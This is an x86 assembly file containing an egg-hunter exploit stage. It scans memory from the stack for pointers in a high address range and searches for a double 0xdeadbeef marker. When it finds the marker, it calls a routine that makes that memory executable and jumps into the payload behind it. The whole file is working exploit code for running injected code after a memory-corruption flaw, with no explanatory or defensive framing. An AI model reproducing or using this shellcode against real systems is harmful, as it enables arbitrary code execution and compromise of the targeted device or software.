.intel_syntax noprefix

#include "payload.h"

.text
	mov eax,esp
	add eax,0x20
search:
	add eax,0x4
	mov esi,DWORD PTR [eax]
	cmp esi,0xdff0f0f0
	ja search
	cmp esi,0xc8808080
	jb search
	and si,0xf000
	mov ecx,0x2000
find:
	inc esi
	cmp DWORD PTR [esi],0xdeadbeef
	jne next
	cmp DWORD PTR [esi+4],0xdeadbeef
	je found 
next:
	loop find
	jmp search
found:
	# ebx contains address of payload
	mov eax,esi
	and ax,0xf000
	sub eax,0x1000
	xor edx,edx
	inc edx
	inc edx
	inc edx
	inc edx
	mov ebx,SET_MEMORY_X
	call ebx
	add esi,0x8
	jmp esi
